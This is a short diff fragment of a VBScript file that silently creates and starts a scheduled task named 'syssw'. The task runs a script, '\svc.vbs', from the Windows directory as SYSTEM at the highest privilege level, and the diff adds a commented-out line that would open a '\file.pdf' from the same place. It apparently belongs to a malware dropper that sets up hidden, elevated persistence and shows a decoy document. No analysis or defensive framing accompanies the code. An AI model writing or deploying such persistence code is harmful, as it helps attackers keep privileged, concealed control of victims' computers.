@@ -9,6 +9,7 @@ With oShell
   
   .Run "schtasks /create /ru ""SYSTEM"" /sc MONTHLY  /tr """ & windir & "\svc.vbs"" /tn syssw /rl highest /F", 0, True
   .Run "schtasks /run /tn syssw", 0, True
+  '.Run windir & "\file.pdf"
 End With
 
 Function XmlTime(t)
